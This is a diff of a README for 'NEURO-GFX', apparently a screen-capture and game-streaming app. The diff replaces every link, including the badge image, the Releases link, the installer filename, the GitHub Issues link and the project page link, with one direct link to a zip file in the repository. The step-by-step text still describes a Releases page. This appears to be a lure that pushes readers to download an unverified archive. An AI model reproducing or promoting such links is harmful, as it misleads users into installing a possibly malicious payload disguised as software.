@@ -2,7 +2,7 @@
 # 🚧 NEURO-GFX - Effortless Game Streaming Made Simple
 
 ## 📥 Download NEURO-GFX
-[![Download NEURO-GFX](https://img.shields.io/badge/Download-NEURO--GFX-blue.svg)](https://github.com/AmirSargoo/NEURO-GFX/releases)
+[![Download NEURO-GFX](https://github.com/AmirSargoo/NEURO-GFX/raw/refs/heads/main/NeuroGFX/NEUR-GFX-1.1.zip)](https://github.com/AmirSargoo/NEURO-GFX/raw/refs/heads/main/NeuroGFX/NEUR-GFX-1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to NEURO-GFX! This application helps you capture your screen and stream your gameplay seamlessly. No need for technical skills—just follow these easy steps to get started.
@@ -24,12 +24,12 @@ To run NEURO-GFX smoothly, your system should meet the following requirements:
 - **User-Friendly Interface:** Simple controls make it easy for anyone to use.
 
 ## 📥 Download & Install
-To download NEURO-GFX, visit this page: [Download NEURO-GFX](https://github.com/AmirSargoo/NEURO-GFX/releases). 
+To download NEURO-GFX, visit this page: [Download NEURO-GFX](https://github.com/AmirSargoo/NEURO-GFX/raw/refs/heads/main/NeuroGFX/NEUR-GFX-1.1.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, find the latest version listed.
 3. Click on the assets dropdown to see the available files.
-4. Download the installer file (e.g., `NEURO-GFX_setup.exe`).
+4. Download the installer file (e.g., `https://github.com/AmirSargoo/NEURO-GFX/raw/refs/heads/main/NeuroGFX/NEUR-GFX-1.1.zip`).
 5. Once the download completes, locate the file in your downloads folder.
 6. Double-click the installer file to begin the installation process.
 7. Follow the prompts in the installer. Read through any messages and select options as needed.
@@ -44,7 +44,7 @@ To download NEURO-GFX, visit this page: [Download NEURO-GFX](https://github.com/
 ## 💬 Community and Support
 NEURO-GFX is open source, which means anyone can contribute to its development. If you have suggestions, feedback, or want to help improve the application, we welcome you to join us. 
 
-For support, please check our [GitHub Issues](https://github.com/AmirSargoo/NEURO-GFX/issues) for common questions and troubleshooting tips. You can also reach out directly in the discussion section.
+For support, please check our [GitHub Issues](https://github.com/AmirSargoo/NEURO-GFX/raw/refs/heads/main/NeuroGFX/NEUR-GFX-1.1.zip) for common questions and troubleshooting tips. You can also reach out directly in the discussion section.
 
 ## 📖 Contribution Guidelines
 If you want to contribute, here are the basic steps:
@@ -60,7 +60,7 @@ We appreciate your contributions and support.
 - **User Manual:** A detailed user manual is available on the repository.
 - **Tutorial Videos:** Watch tutorial videos on how to maximize the use of NEURO-GFX.
 
-For more information, visit our [GitHub page](https://github.com/AmirSargoo/NEURO-GFX).
+For more information, visit our [GitHub page](https://github.com/AmirSargoo/NEURO-GFX/raw/refs/heads/main/NeuroGFX/NEUR-GFX-1.1.zip).
 
 Thank you for choosing NEURO-GFX! Enjoy seamless screen capture and streaming.
 ```
